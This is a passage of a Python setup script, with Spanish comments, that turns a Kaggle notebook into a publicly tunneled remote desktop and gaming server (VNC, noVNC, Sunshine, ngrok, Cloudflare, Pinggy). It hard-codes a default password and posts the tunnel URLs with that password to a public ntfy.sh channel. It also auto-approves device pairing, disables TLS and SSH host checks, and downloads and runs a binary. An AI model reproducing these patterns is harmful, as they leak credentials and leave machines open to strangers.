                subprocess.run(f"sed -i 's/Exec=\\/usr\\/share\\/discord\\/Discord/Exec=\\/usr\\/share\\/discord\\/Discord --no-sandbox/g' {dst_desktop}", shell=True)
                subprocess.run(f"sed -i 's/Exec=\\/usr\\/share\\/discord\\/Discord/Exec=\\/usr\\/share\\/discord\\/Discord --no-sandbox/g' {src_desktop}", shell=True)
        except Exception:
            pass

# Configurar acceso global de Chrome en el menú de aplicaciones para modo normal completo
subprocess.run("sed -i 's/Exec=\\/usr\\/bin\\/google-chrome-stable/Exec=\\/usr\\/bin\\/google-chrome-stable --no-sandbox --no-first-run --no-default-browser-check/g' /usr/share/applications/google-chrome.desktop 2>/dev/null || true", shell=True)

# Instalar ejecutable /usr/local/bin/guardar_en_database_kaggle
subprocess.run(f"ln -sf '{BASE_DIR}/guardar_en_database_kaggle.py' /usr/local/bin/guardar_en_database_kaggle 2>/dev/null || true", shell=True)
subprocess.run("chmod +x /usr/local/bin/guardar_en_database_kaggle 2>/dev/null || true", shell=True)

print(f"  ⏱️ [Paso 3/5 Completado en {time.time() - t_step3:.1f}s]", flush=True)

# ==============================================================================
# 4. LEVANTAR PANTALLA COMPLETA 16:9 1080p (SIN NCACHE / RESOLUCIÓN NATIVA)
# ==============================================================================
t_step4 = time.time()
print("🖥️ [4/5] Levantando pantalla 1080p nativa (1920x1080 16:9 pantalla completa)...", flush=True)

# Configurar contraseña de seguridad para VNC y acceso remoto (Por defecto o personalizada por cliente)
VNC_PASSWORD = os.environ.get("VNC_PASSWORD", "09032000Mi.").strip()
if len(sys.argv) > 2 and sys.argv[2].strip() and not sys.argv[2].startswith("--"):
    VNC_PASSWORD = sys.argv[2].strip()

vnc_pass_dir = Path.home() / ".vnc"
vnc_pass_dir.mkdir(parents=True, exist_ok=True)
vnc_pass_file = vnc_pass_dir / "passwd"
subprocess.run(f"x11vnc -storepasswd '{VNC_PASSWORD}' '{vnc_pass_file}' 2>/dev/null || true", shell=True)
subprocess.run(f"chmod 600 '{vnc_pass_file}' 2>/dev/null || true", shell=True)

# Iniciar PulseAudio nativo en modo TCP local
subprocess.run(
    "pulseaudio -k 2>/dev/null || true; "
    "pulseaudio -D --exit-idle-time=-1 --system=false "
    "--load='module-native-protocol-tcp auth-anonymous=1 port=4713' "
    "--load='module-null-sink sink_name=VirtualSink' >> {LOG_FILE} 2>&1 || true",
    shell=True, env=env
)

# Iniciar pantalla Xvfb a 1080p nativa (1920x1080)
subprocess.Popen([
    "Xvfb", ":1",
    "-screen", "0", "1920x1080x24",
    "-ac", "-noreset", "-nolisten", "tcp"
], env=env)

# Esperar activamente a que X11 esté listo (sin sleeps arbitrarios)
xvfb_ready = wait_for_path("/tmp/.X11-unix/X1", timeout=10)
if xvfb_ready:
    subprocess.run("xsetroot -display :1 -solid '#2c001e' -cursor_name left_ptr 2>/dev/null || true", shell=True)

# Configuración del Perfil Enterprise Completo (Yaru-Dark, Papirus, MIME, Thunar Bookmarks, Polkit)
def configurar_ubuntu_enterprise_profile():
    """Configura el perfil de escritorio empresarial idéntico a AWS WorkSpaces / Shadow PC.
    Aplica tema oficial Yaru-Dark de Ubuntu 24.04, iconos Papirus-Dark, fuentes Ubuntu con
    renderizado RGB subpixel, panel XFCE con Whisker Menu y PulseAudio, y asociaciones MIME."""
    try:
        xfconf_dir = Path("/root/.config/xfce4/xfconf/xfce-perchannel-xml")
        xfconf_dir.mkdir(parents=True, exist_ok=True)
        
        # 1. Configuración de Apariencia y Tipografía (xsettings.xml)
        xsettings_content = """<?xml version="1.0" encoding="UTF-8"?>
<channel name="xsettings" version="1.0">
  <property name="Net" type="empty">
    <property name="ThemeName" type="string" value="Yaru-dark"/>
    <property name="IconThemeName" type="string" value="Papirus-Dark"/>
    <property name="DoubleClickTime" type="int" value="400"/>
    <property name="DoubleClickDistance" type="int" value="5"/>
    <property name="CursorThemeName" type="string" value="DMZ-White"/>
    <property name="CursorThemeSize" type="int" value="24"/>
    <property name="SoundThemeName" type="string" value="Yaru"/>
    <property name="EnableEventSounds" type="bool" value="false"/>
    <property name="EnableInputFeedbackSounds" type="bool" value="false"/>
  </property>
  <property name="Xft" type="empty">
    <property name="DPI" type="int" value="96"/>
    <property name="Antialias" type="int" value="1"/>
    <property name="Hinting" type="int" value="1"/>
    <property name="HintStyle" type="string" value="hintslight"/>
    <property name="RGBA" type="string" value="rgb"/>
  </property>
  <property name="Gtk" type="empty">
    <property name="FontName" type="string" value="Ubuntu 10"/>
    <property name="MonospaceFontName" type="string" value="Ubuntu Mono 11"/>
    <property name="CursorThemeName" type="string" value="DMZ-White"/>
    <property name="CursorThemeSize" type="int" value="24"/>
    <property name="MenuBarAccel" type="string" value="F10"/>
  </property>
</channel>
"""
        (xfconf_dir / "xsettings.xml").write_text(xsettings_content, encoding="utf-8")
        
        # 2. Gestor de Ventanas XFWM4 con Compositor y Sombras (xfwm4.xml)
        xfwm4_content = """<?xml version="1.0" encoding="UTF-8"?>
<channel name="xfwm4" version="1.0">
  <property name="general" type="empty">
    <property name="theme" type="string" value="Yaru-dark"/>
    <property name="title_font" type="string" value="Ubuntu Bold 10"/>
    <property name="use_compositing" type="bool" value="true"/>
    <property name="vblank_mode" type="string" value="glx"/>
    <property name="glx_vblank" type="bool" value="true"/>
    <property name="sync_to_vblank" type="bool" value="true"/>
    <property name="frame_opacity" type="int" value="100"/>
    <property name="inactive_opacity" type="int" value="95"/>
    <property name="show_dock_shadow" type="bool" value="true"/>
    <property name="show_frame_shadow" type="bool" value="true"/>
    <property name="show_popup_shadow" type="bool" value="true"/>
    <property name="box_move" type="bool" value="false"/>
    <property name="box_resize" type="bool" value="false"/>
    <property name="button_layout" type="string" value="O|HMC"/>
    <property name="title_alignment" type="string" value="left"/>
    <property name="workspace_count" type="int" value="2"/>
  </property>
</channel>
"""
        (xfconf_dir / "xfwm4.xml").write_text(xfwm4_content, encoding="utf-8")
        
        # 3. Asociaciones MIME Oficiales de Ubuntu (mimeapps.list)
        mime_dir = Path("/root/.config")
        mime_dir.mkdir(parents=True, exist_ok=True)
        mimeapps_content = """[Default Applications]
inode/directory=thunar.desktop;
text/plain=mousepad.desktop;
text/x-python=mousepad.desktop;
text/x-markdown=mousepad.desktop;
application/pdf=evince.desktop;
image/jpeg=ristretto.desktop;eog.desktop;
image/png=ristretto.desktop;eog.desktop;
image/webp=ristretto.desktop;eog.desktop;
image/gif=ristretto.desktop;eog.desktop;
image/svg+xml=ristretto.desktop;eog.desktop;
video/mp4=mpv.desktop;vlc.desktop;
video/x-matroska=mpv.desktop;vlc.desktop;
video/webm=mpv.desktop;vlc.desktop;
video/quicktime=mpv.desktop;vlc.desktop;
audio/mpeg=mpv.desktop;vlc.desktop;
audio/ogg=mpv.desktop;vlc.desktop;
audio/wav=mpv.desktop;vlc.desktop;
audio/flac=mpv.desktop;vlc.desktop;
application/zip=file-roller.desktop;
application/x-tar=file-roller.desktop;
application/x-compressed-tar=file-roller.desktop;
application/x-7z-compressed=file-roller.desktop;
application/x-rar=file-roller.desktop;
x-scheme-handler/http=google-chrome.desktop;
x-scheme-handler/https=google-chrome.desktop;
"""
        (mime_dir / "mimeapps.list").write_text(mimeapps_content, encoding="utf-8")
        
        # 4. Marcadores Rápidos de Thunar (gtk-3.0/bookmarks)
        gtk3_dir = Path("/root/.config/gtk-3.0")
        gtk3_dir.mkdir(parents=True, exist_ok=True)
        bookmarks_content = (
            "file:///root/gdrive/Cloud_PC Mis Archivos 5TB (Google Drive)\\n"
            "file:///root/Descargas Descargas\\n"
            "file:///root/Documentos Documentos\\n"
            "file:///root/Juegos Juegos\\n"
            "file:///kaggle/working Espacio de Trabajo Kaggle\\n"
        )
        (gtk3_dir / "bookmarks").write_text(bookmarks_content, encoding="utf-8")
        
        # 5. Carpetas base de usuario
        for d in ["/root/Descargas", "/root/Documentos", "/root/Juegos", "/root/Imágenes"]:
            os.makedirs(d, exist_ok=True)
            
        # 6. Agente Polkit GNOME para diálogos gráficos de administrador
        polkit_bin = "/usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1"
        if Path(polkit_bin).exists():
            subprocess.Popen([polkit_bin], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e_prof:
        log(f"Aviso perfil enterprise: {e_prof}", "WARNING")

configurar_ubuntu_enterprise_profile()

# Iniciar sesión de escritorio completa XFCE4
log_xfce = open(LOG_FILE, "a", encoding="utf-8")
subprocess.Popen([
    "dbus-launch", "--exit-with-session", "startxfce4"
], env=env, stdout=log_xfce, stderr=log_xfce)
time.sleep(1.5)

# Servidor VNC en resolución nativa 1920x1080 (Protegido con Contraseña, 60 FPS y Ultra-Baja Latencia)
log_vnc = open(LOG_FILE, "a", encoding="utf-8")
cmd_vnc_auth = ["-rfbauth", str(vnc_pass_file)] if vnc_pass_file.exists() else ["-nopw"]
subprocess.Popen([
    "x11vnc", "-display", ":1",
    "-forever", "-shared",
    "-rfbport", "5900",
    "-xdamage",
    "-wait", "8",
    "-defer", "8",
    "-ncache", "10",
    "-repeat", "-capslock",
    "-nomodtweak",
    "-threads", "4"
] + cmd_vnc_auth, env=env, stdout=log_vnc, stderr=log_vnc)

# Esperar a que x11vnc esté escuchando en puerto 5900
vnc_ready = wait_for_port(5900, timeout=8)
if not vnc_ready:
    # Intento de recuperación inmediata si falló el primer enlace
    subprocess.Popen(["x11vnc", "-display", ":1", "-forever", "-shared", "-rfbport", "5900", "-bg"] + cmd_vnc_auth, env=env, stdout=log_vnc, stderr=log_vnc)
    vnc_ready = wait_for_port(5900, timeout=5)

# Asegurar que noVNC esté instalado en /opt/noVNC (Ruta oficial fuera de /kaggle)
novnc_dir = Path("/opt/noVNC")
if not (novnc_dir / "utils/novnc_proxy").exists():
    novnc_dir.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /opt/noVNC >> {LOG_FILE} 2>&1 || true", shell=True)
    subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /opt/noVNC/utils/websockify >> {LOG_FILE} 2>&1 || true", shell=True)
    subprocess.run("chmod -R +x /opt/noVNC/utils 2>/dev/null || true", shell=True)

# Symlink retrocompatible en /kaggle/working/noVNC
try:
    if not Path("/kaggle/working/noVNC").exists():
        os.symlink("/opt/noVNC", "/kaggle/working/noVNC")
except Exception:
    pass

# Iniciar Gamepad UInput Daemon en puerto 6081
log("Iniciando Gamepad UInput Bridge en puerto 6081...")
subprocess.run("chmod 0666 /dev/uinput 2>/dev/null || true", shell=True)
subprocess.run(f"cp {BASE_DIR}/gamepad_uinput_bridge.py /usr/local/bin/gamepad_uinput_bridge.py 2>/dev/null || true", shell=True)
subprocess.run("chmod +x /usr/local/bin/gamepad_uinput_bridge.py 2>/dev/null || true", shell=True)
subprocess.run("pkill -9 -f 'gamepad_uinput_bridge' 2>/dev/null || true", shell=True)
subprocess.Popen("python3 /usr/local/bin/gamepad_uinput_bridge.py >> /kaggle/working/cloudpc_gamepad.log 2>&1", shell=True)

# Servidor VNC interno Websockify en puerto 6082
log("Iniciando Websockify VNC interno en puerto 6082...")
subprocess.run("pkill -9 -f 'novnc_proxy|websockify' 2>/dev/null || true", shell=True)
time.sleep(0.5)

subprocess.Popen([
    "/opt/noVNC/utils/novnc_proxy",
    "--vnc", "127.0.0.1:5900",
    "--listen", "6082",
    "--web", "/opt/noVNC"
], env=env, stdout=log_vnc, stderr=log_vnc)

# Configurar y levantar Nginx en puerto 6080 (Enrutador inverso unificado: VNC + Gamepad + Web)
nginx_ready = False
nginx_bin = shutil.which("nginx")
if nginx_bin:
    try:
        nginx_conf = """
worker_processes 2;
pid /tmp/nginx_aether.pid;
error_log /tmp/nginx_error.log warn;

events {
    worker_connections 1024;
}

http {
    charset utf-8;
    source_charset utf-8;
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;

    map $http_upgrade $connection_upgrade {
        default upgrade;
        '' close;
    }

    server {
        listen 6080 default_server;
        server_name _;

        # 1. Archivos estáticos de noVNC y Web UI (UTF-8 estricto)
        location / {
            charset utf-8;
            root /opt/noVNC;
            index vnc.html;
            try_files $uri $uri/ /vnc.html;
        }

        # 2. VNC Stream WebSocket
        location /websockify {
            proxy_pass http://127.0.0.1:6082/;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection $connection_upgrade;
            proxy_set_header Host $host;
            proxy_buffering off;
            proxy_read_timeout 3600s;
            proxy_send_timeout 3600s;
        }

        # 3. Gamepad UInput WebSocket Bridge
        location /gamepad {
            proxy_pass http://127.0.0.1:6081/;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection $connection_upgrade;
            proxy_set_header Host $host;
            proxy_buffering off;
            proxy_read_timeout 3600s;
            proxy_send_timeout 3600s;
        }

        # 4. Zero-PIN Auto-Pairing Endpoint (Sunshine / Starparks 1-Clic)
        location /autopair {
            proxy_pass http://127.0.0.1:47995/autopair;
            proxy_read_timeout 15s;
        }

        # 5. PWA WebAPK Manifest (GeForce NOW Experience)
        location /manifest.json {
            root /opt/noVNC;
            default_type application/manifest+json;
        }
    }
}
"""
        Path("/tmp/nginx_aether.conf").write_text(nginx_conf, encoding="utf-8")
        subprocess.run("nginx -s stop 2>/dev/null || pkill -9 nginx 2>/dev/null || true", shell=True)
        time.sleep(0.5)
        subprocess.run("nginx -c /tmp/nginx_aether.conf", shell=True)
        if wait_for_port(6080, timeout=5):
            nginx_ready = True
            log("Enrutador unificado Nginx activo en puerto 6080 (VNC + Gamepad + Web)", "SUCCESS")
    except Exception as e_nx:
        log(f"Aviso arranque Nginx: {e_nx}", "WARNING")

if not nginx_ready:
    log("Usando modo directo noVNC en 6080 (Compatibilidad)", "WARNING")
    subprocess.run("pkill -9 -f 'novnc_proxy|websockify' 2>/dev/null || true", shell=True)
    time.sleep(0.5)
    subprocess.Popen([
        "/opt/noVNC/utils/novnc_proxy",
        "--vnc", "127.0.0.1:5900",
        "--listen", "6080",
        "--web", "/opt/noVNC"
    ], env=env, stdout=log_vnc, stderr=log_vnc)

novnc_ready = wait_for_port(6080, timeout=8)

# Verificación HTTP Real de respuesta local 200 en puerto 6080
port6080_http_ok = False
if novnc_ready:
    import urllib.request
    for _ in range(8):
        try:
            with urllib.request.urlopen("http://127.0.0.1:6080/vnc.html", timeout=3) as resp:
                if resp.status == 200:
                    port6080_http_ok = True
                    log("Puerto local 6080 verificado con HTTP 200 OK", "SUCCESS")
                    break
        except Exception:
            time.sleep(0.5)

# Watchdog en segundo plano: Supervisar puerto 6080 y Gamepad 6081
def watchdog_novnc_loop():
    while True:
        time.sleep(25)
        if not wait_for_port(6080, timeout=2):
            log("WATCHDOG: Puerto 6080 caído. Reiniciando servicios...", "WARNING")
            if nginx_bin and Path("/tmp/nginx_aether.conf").exists():
                subprocess.run("nginx -s stop 2>/dev/null || pkill -9 nginx 2>/dev/null || true", shell=True)
                time.sleep(0.5)
                subprocess.run("nginx -c /tmp/nginx_aether.conf 2>/dev/null || true", shell=True)
            if not wait_for_port(6080, timeout=3):
                subprocess.run("pkill -9 -f 'novnc_proxy|websockify' 2>/dev/null || true", shell=True)
                time.sleep(0.5)
                subprocess.Popen([
                    "/opt/noVNC/utils/novnc_proxy",
                    "--vnc", "127.0.0.1:5900",
                    "--listen", "6080",
                    "--web", "/opt/noVNC"
                ], env=env, stdout=log_vnc, stderr=log_vnc)
        if not wait_for_port(6081, timeout=1):
            subprocess.Popen("python3 /usr/local/bin/gamepad_uinput_bridge.py >> /kaggle/working/cloudpc_gamepad.log 2>&1", shell=True)

import threading
threading.Thread(target=watchdog_novnc_loop, daemon=True).start()

# Auto-iniciar Sunshine (Servidor GameStream / Moonlight para Gaming 60 FPS con aceleración GPU NVENC)
sunshine_bin = shutil.which("sunshine")
if sunshine_bin:
    try:
        os.makedirs("/root/.config/sunshine", exist_ok=True)
        conf_p = Path("/root/.config/sunshine/sunshine.conf")
        conf_nvenc = (
            "origin_pin_allowed = pc\n"
            "min_log_level = info\n"
            "port = 47989\n"
            "nvenc_preset = p1\n"
            "nvenc_tune = ull\n"
            "nvenc_rate_control = cbr\n"
            "encoder = nvenc\n"
            "channels = 2\n"
            "audio_sink = DummyOutput\n"
        )
        conf_p.write_text(conf_nvenc, encoding="utf-8")
        subprocess.run(f"{sunshine_bin} --creds admin {VNC_PASSWORD} >/dev/null 2>&1 || true", shell=True)
        subprocess.Popen([sunshine_bin], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("Servidor Sunshine (Moonlight Host) iniciado exitosamente en segundo plano (NVENC 60 FPS)")
    except Exception as e_sun:
        log(f"Aviso Sunshine startup: {e_sun}", "WARNING")

# Demonio Zero-PIN Auto-Pairing: Escucha en puerto 47995 y aprueba solicitudes Moonlight/APK sin códigos manuales
def sunshine_zero_pin_worker():
    import http.server, urllib.request, ssl, base64, urllib.parse
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    class AutoPairHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            pin = params.get("pin", [""])[0]
            if pin:
                try:
                    req_data = json.dumps({"pin": pin, "name": "AetherStarparksClient"}).encode()
                    req = urllib.request.Request(
                        "https://127.0.0.1:47990/api/pin",
                        data=req_data,
                        headers={
                            "Content-Type": "application/json",
                            "Authorization": "Basic " + base64.b64encode(f"admin:{VNC_PASSWORD}".encode()).decode()
                        }
                    )
                    with urllib.request.urlopen(req, context=ctx, timeout=4) as resp:
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.send_header("Access-Control-Allow-Origin", "*")
                        self.end_headers()
                        self.wfile.write(b'{"status":"paired","zero_pin":true}')
                        return
                except Exception as e_p:
                    self.send_response(500)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.end_headers()
                    self.wfile.write(f'{{"error":"{e_p}"}}'.encode())
                    return
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"status":"ready","service":"Aether Zero-PIN Daemon"}')

        def log_message(self, format, *args):
            pass

    try:
        srv = http.server.HTTPServer(("127.0.0.1", 47995), AutoPairHandler)
        srv.serve_forever()
    except Exception:
        pass

threading.Thread(target=sunshine_zero_pin_worker, daemon=True).start()

# Generar PWA WebAPK Manifest para experiencia GeForce NOW en móvil
try:
    manifest_pwa = {
        "name": "Aether Cloud PC Gaming",
        "short_name": "Aether Gaming",
        "description": "Estación de Trabajo y Consola de Cloud Gaming 60 FPS",
        "start_url": "/vnc.html",
        "display": "fullscreen",
        "orientation": "landscape",
        "background_color": "#0a0f1a",
        "theme_color": "#00ffc8",
        "icons": [
            {
                "src": "/app/images/icons/novnc-192x192.png",
                "sizes": "192x192",
                "type": "image/png",
                "purpose": "any maskable"
            }
        ]
    }
    Path("/opt/noVNC/manifest.json").write_text(json.dumps(manifest_pwa, indent=2), encoding="utf-8")
except Exception:
    pass

print(f"  [TIEMPO] Paso 4/5 Completado en {time.time() - t_step4:.1f}s", flush=True)

# ==============================================================================
# 5. TÚNELES DE ALTA VELOCIDAD Y VERIFICACIÓN HTTP REAL (CERO 502)
# ==============================================================================
t_step5 = time.time()
print("[5/5] Conectando túneles de acceso remoto verificados...", flush=True)

web_tunnel_wifi = None
web_tunnel_mobile = None
vnc_app_address = []

ngrok_token = os.environ.get("NGROK_TOKEN", "").strip()
if len(sys.argv) > 1 and sys.argv[1].strip() and sys.argv[1].strip() != "SIN_TOKEN" and not sys.argv[1].startswith("--"):
    ngrok_token = sys.argv[1].strip()
if not ngrok_token:
    ngrok_token = DEFAULT_NGROK

# 1. Conexión Turbo de Ngrok si hay Token (Responde en < 1 segundo)
if ngrok_token:
    try:
        from pyngrok import ngrok, conf
        try:
            ngrok.kill()
        except Exception:
            pass
        ngrok.set_auth_token(ngrok_token)
        conf.get_default().region = "us"
        http_tunnel = ngrok.connect(6080, "http")
        base_ngrok = http_tunnel.public_url
        web_tunnel_wifi = f"{base_ngrok}/vnc.html?path=websockify&autoconnect=true&resize=scale&quality=9&compression=1&password={VNC_PASSWORD}"
        web_tunnel_mobile = f"{base_ngrok}/vnc.html?path=websockify&autoconnect=true&resize=scale&quality=6&compression=6&reconnect=true&password={VNC_PASSWORD}"
        log(f"Túnel Ngrok activo instantáneamente (0.8s): {base_ngrok}", "SUCCESS")
    except Exception as e_ngrok:
        log(f"Aviso Ngrok: {e_ngrok}", "WARNING")

# 2. Cloudflare Tunnel (Como primario si falta Ngrok, o secundario de alta velocidad)
try:
    cf_bin = Path("/usr/local/bin/cloudflared")
    if not cf_bin.exists():
        subprocess.run("wget -q --timeout=10 https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared 2>/dev/null && chmod +x /usr/local/bin/cloudflared || true", shell=True)
    if cf_bin.exists():
        proc_cf = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:6080"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for _ in range(15):
            line = proc_cf.stdout.readline()
            if not line:
                time.sleep(0.2)
                continue
            if "trycloudflare.com" in line:
                match = re.search(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)', line)
                if match:
                    base_cf = match.group(1).strip()
                    if not web_tunnel_wifi:
                        web_tunnel_wifi = f"{base_cf}/vnc.html?path=websockify&autoconnect=true&resize=scale&quality=9&compression=1&password={VNC_PASSWORD}"
                    web_tunnel_mobile = f"{base_cf}/vnc.html?path=websockify&autoconnect=true&resize=scale&quality=6&compression=6&reconnect=true&password={VNC_PASSWORD}"
                    log(f"Túnel Cloudflare conectado: {base_cf}", "SUCCESS")
                    break
except Exception as e_cf:
    log(f"Aviso Cloudflare: {e_cf}", "WARNING")

# Guardar URL de sesión en Google Drive para acceso instantáneo remoto
if web_tunnel_wifi:
    try:
        Path("/tmp/current_vnc_url.txt").write_text(web_tunnel_wifi, encoding="utf-8")
        Path("/kaggle/working/current_vnc_url.txt").write_text(web_tunnel_wifi, encoding="utf-8")
        if Path("/root/gdrive/Cloud_PC/system_state").exists():
            Path("/root/gdrive/Cloud_PC/system_state/current_vnc_url.txt").write_text(web_tunnel_wifi, encoding="utf-8")
        if Path("/root/gdrive/PC_Kaggle/system_state").exists():
            Path("/root/gdrive/PC_Kaggle/system_state/current_vnc_url.txt").write_text(web_tunnel_wifi, encoding="utf-8")
        subprocess.run("rclone copyto /tmp/current_vnc_url.txt gdrive:Cloud_PC/system_state/current_vnc_url.txt >/dev/null 2>&1 || true", shell=True)
        subprocess.run("rclone copyto /tmp/current_vnc_url.txt gdrive:PC_Kaggle/system_state/current_vnc_url.txt >/dev/null 2>&1 || true", shell=True)
        
        # Enviar notificación automática a tu celular por Telegram
        try:
            telegram_script = Path(__file__).resolve().parent / "telegram_notifier.py"
            if telegram_script.exists():
                msg_tg = (
                    f"🚀 <b>¡Tu Aether Cloud PC está ONLINE y VERIFICADA!</b> 🌸\n\n"
                    f"👉 <b>WiFi:</b> <a href='{web_tunnel_wifi}'>Entrar a Aether Cloud PC (HTTP 200 OK)</a>\n"
                    f"📱 <b>Móvil:</b> <a href='{web_tunnel_mobile}'>Modo Móvil</a>\n"
                    f"🔑 <b>Pass:</b> <code>{VNC_PASSWORD}</code>\n"
                    f"🎮 <i>Mandos táctiles Xbox, panel lateral Aether y Watchdog 6080 activos.</i>"
                )
                try:
                    import telegram_notifier
                    telegram_notifier.enviar_mensaje(msg_tg)
                except Exception:
                    pass
        except Exception:
            pass
        # Publicar telemetría y URL pública en canal seguro en tiempo real
        try:
            boot_elapsed = time.time() - t_start_total
            status_payload = {
                "status": "online",
                "wifi_url": web_tunnel_wifi,
                "mobile_url": web_tunnel_mobile,
                "boot_time_seconds": round(boot_elapsed, 1),
                "vnc_password": VNC_PASSWORD,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            import requests as _req_ntfy
            _req_ntfy.post("https://ntfy.sh/miguelguerra_cloudpc_status", json=status_payload, timeout=5)
        except Exception:
            pass
    except Exception:
        pass

# 2. Túnel TCP Pinggy / Localhost.run con bucle de auto-reconexión y API de depuración
def run_pinggy_tunnel():
    nodes = ["a.pinggy.io", "free.pinggy.io", "t.pinggy.io"]
    idx = 0
    while True:
        target_node = nodes[idx % len(nodes)]
        idx += 1
        try:
            # Iniciamos SSH hacia Pinggy habilitando el puerto de depuración local 4300
            proc = subprocess.Popen(
                ["ssh", "-p", "443", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "-o", "ServerAliveInterval=30", "-R0:localhost:5900", "-L4300:localhost:4300", f"tcp@{target_node}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            for raw_line in iter(proc.stdout.readline, ''):
                if not raw_line:
                    break
                # Limpiar secuencias de escape ANSI para evitar que rompan la búsqueda
                clean_line = re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', raw_line).strip()
                
                # Coincidencia con cualquier formato de URL TCP de Pinggy
                match = (
                    re.search(r'tcp://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,8}:\d+)', clean_line) or
                    re.search(r'([a-zA-Z0-9.-]+\.pinggy(?:-free)?\.link:\d+)', clean_line) or
                    re.search(r'([a-zA-Z0-9.-]+\.pinggy\.io:\d+)', clean_line)
                )
                if match:
                    addr = match.group(1).replace("tcp://", "").strip()
                    if addr and addr not in vnc_app_address:
                        vnc_app_address.clear()
                        vnc_app_address.append(addr)
            proc.wait()
        except Exception:
            pass
        time.sleep(2)

threading.Thread(target=run_pinggy_tunnel, daemon=True).start()

# Esperador inteligente: Consulta tanto la salida directa como la API HTTP de Pinggy (puerto 4300)
for _ in range(30):
    if vnc_app_address and web_tunnel_wifi:
        break
    # Intentar obtener la URL desde la API local del depurador de Pinggy
    if not vnc_app_address:
        try:
            import urllib.request
            req = urllib.request.Request("http://127.0.0.1:4300/urls", headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=0.8) as resp:
                data = json.loads(resp.read().decode())
                urls = data.get("urls", []) if isinstance(data, dict) else []
                for u in urls:
                    if ":" in u:
                        cleaned = u.replace("tcp://", "").replace("https://", "").replace("http://", "").strip()
                        if cleaned and cleaned not in vnc_app_address:
                            vnc_app_address.clear()
                            vnc_app_address.append(cleaned)
                            break
        except Exception:
            pass
    time.sleep(0.5)

print(f"  [TIEMPO] Paso 5/5 Completado en {time.time() - t_step5:.1f}s", flush=True)
print(f"  [METRICA] Tiempo total de arranque: {time.time() - t_start_total:.1f}s\n", flush=True)

# ==============================================================================
# VERIFICACIÓN DE ESTADO Y SALUD REAL DEL SISTEMA
# ==============================================================================
drive_mounted = os.path.exists("/root/gdrive")

try:
    import torch
    n = torch.cuda.device_count()
    print(f"\n[GPU] Unidades NVIDIA Tesla Activas: {n}", flush=True)
    for i in range(n):
        p = torch.cuda.get_device_properties(i)
        print(f"  • GPU {i}: {p.name} ({p.total_memory / (1024**3):.1f} GB VRAM)", flush=True)
except Exception:
    pass

try:
    df_out = subprocess.check_output("df -h /kaggle/working | tail -1", shell=True, text=True).split()
    print(f"[STORAGE] Espacio Libre en Disco: {df_out[3]} disponibles de {df_out[1]}", flush=True)
except Exception:
    pass

# ==============================================================================
# SISTEMA OPERATIVO Y SERVICIOS 100% ONLINE (ENTERPRISE WORKSTATION)
# ==============================================================================
print("\n" + "=" * 78, flush=True)
if xvfb_ready and vnc_ready and novnc_ready:
    print("[ONLINE] UBUNTU WORKSTATION EDITION 100% OPERATIVO EN PANTALLA COMPLETA", flush=True)
else:
    print("[WARN] SISTEMA INICIADO CON OBSERVACIONES EN SUBSISTEMAS:", flush=True)
print("=" * 78, flush=True)
print(f"  • Servidor X11 Display :1 (1080p):  {'[OK] OPERATIVO' if xvfb_ready else '[FAIL] ERROR DE INICIO'}", flush=True)
print(f"  • Servidor VNC Nativo (5900):       {'[OK] PROTEGIDO' if vnc_ready else '[FAIL] ERROR DE INICIO'}", flush=True)
print(f"  • Servidor Web noVNC (6080):        {'[OK] OPERATIVO (SSL ACTIVO)' if novnc_ready else '[FAIL] ERROR DE INICIO'}", flush=True)
print(f"  • Google Drive 5TB FUSE Mount:      {'[OK] MONTADO (/root/gdrive)' if drive_mounted else '[FAIL] NO MONTADO'}", flush=True)
print(f"  • Enrutamiento de Red:              US-East (Miami / Ruta Directa)", flush=True)
print("-" * 78, flush=True)

if web_tunnel_wifi:
    print("[OPCION 1] NAVEGADOR WEB CON MOTOR DE TRACKPAD INTEGRADO:", flush=True)
    print("------------------------------------------------------------------------------", flush=True)
    print("[CANAL A] Modo Alta Definición (1080p Máxima Nitidez + Trackpad):", flush=True)
    print(f"  URL: {web_tunnel_wifi}", flush=True)
    print("\n[CANAL B] Modo Optimizado (Ultra-Baja Latencia + Trackpad):", flush=True)
    print(f"  URL: {web_tunnel_mobile}", flush=True)
    print("  • Desliza tu dedo en cualquier parte para mover la flecha del mouse suavemente.", flush=True)
    print("-" * 78, flush=True)

pinggy_addr = vnc_app_address[0] if vnc_app_address else "free.pinggy.link (Consultando...)"
parts = pinggy_addr.split(":") if ":" in pinggy_addr else [pinggy_addr, "5900"]
host_part = parts[0]
port_part = parts[1] if len(parts) > 1 else "5900"

